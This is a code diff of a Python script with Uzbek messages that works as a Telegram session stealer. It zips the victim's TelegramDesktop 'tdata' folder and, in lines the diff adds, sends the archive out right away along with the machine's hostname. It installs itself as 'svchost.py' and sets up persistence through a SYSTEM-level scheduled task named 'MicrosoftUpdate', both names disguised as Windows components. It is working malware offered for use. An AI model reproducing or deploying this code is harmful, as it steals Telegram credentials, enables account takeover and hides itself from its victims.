@@ -48,7 +48,6 @@ def get_tdata():
     pc_name = socket.gethostname()
     appdata = os.getenv('APPDATA')
     tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
-
     if os.path.exists(tdata_path):
         try:
             temp_dir = tempfile.gettempdir()
@@ -59,8 +58,7 @@ def get_tdata():
                         try:
                             file_path = os.path.join(root, file)
                             zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
-                        except:
-                            pass
+                        except: pass
             return zip_path
         except:
             return None
@@ -68,26 +66,31 @@ def get_tdata():
 
 def install_persistence():
     try:
-        # O'zini AppData ga saqlaydi
         script_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
         if not os.path.exists(script_path):
             content = urllib.request.urlopen(sys.argv[0]).read().decode()
             with open(script_path, 'w') as f:
                 f.write(content)
-
-        # Task Scheduler ga qo'shadi
         subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f'], shell=True)
         return True
     except:
         return False
 
-# Asosiy ish
+# MAIN (O'rnatish + BIRINCHI tdata yuborish)
 last_sent = 0
-send_msg(f"🟢 Checker o'rnatildi: {socket.gethostname()}")
+send_msg(f"🟢 Checker o'rnatilmoqda: {socket.gethostname()}")
 
 if install_persistence():
     send_msg(f"✅ Task Scheduler ga qo'shildi!")
 
+# ❗HOZIR BIRINCHI TDATANI YUBORAMIZ
+zip_path = get_tdata()
+if zip_path:
+    send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {socket.gethostname()}")
+    os.remove(zip_path)
+    send_msg(f"✅ Birinchi tdata muvaffaqiyatli yuborildi!")
+
+# ENDI DOIMIY KUZATISH
 while True:
     time.sleep(60)
     try:
